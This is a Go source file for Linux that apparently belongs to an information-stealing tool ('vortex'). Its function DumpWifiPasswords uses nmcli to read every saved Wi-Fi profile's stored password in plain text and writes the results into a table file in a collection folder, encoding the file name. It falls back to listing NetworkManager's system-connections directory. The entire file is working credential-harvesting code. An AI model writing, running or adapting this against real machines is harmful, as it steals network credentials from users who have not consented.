//go:build linux

package wifi

import (
    "os"
    "os/exec"
    "path/filepath"
    "strings"

    "github.com/olekukonko/tablewriter"
    "vortex/encrypt"
)

func DumpWifiPasswords(mainFolder string) error {
    wifiFile := filepath.Join(mainFolder, encrypt.B64Util("wifi-creds.txt", 0))
    f, err := os.Create(wifiFile)
    if err != nil {
        return err
    }
    defer f.Close()
    t := tablewriter.NewWriter(f)
    t.SetHeader([]string{"Wifi Profile Name", "Security", "Password"})
    // Try nmcli
    out, err := exec.Command("nmcli", "-t", "-f", "name", "connection", "show").Output()
    if err != nil {
        // Fallback to parsing NetworkManager system-connections
        dir := "/etc/NetworkManager/system-connections"
        if entries, err2 := os.ReadDir(dir); err2 == nil {
            for _, e := range entries {
                t.Append([]string{e.Name(), "WPA2", "<requires root>"})
            }
            t.Render()
            return nil
        }
        return err
    }
    for _, line := range strings.Split(strings.TrimSpace(string(out)), "\n") {
        ssid := strings.TrimSpace(line)
        if ssid == "" {
            continue
        }
        secOut, _ := exec.Command("nmcli", "-s", "-g", "802-11-wireless-security.psk", "connection", "show", ssid).Output()
        pass := strings.TrimSpace(string(secOut))
        if pass == "" {
            pass = "<no-access>"
        }
        t.Append([]string{ssid, "WPA2", pass})
    }
    t.Render()
    return nil
}
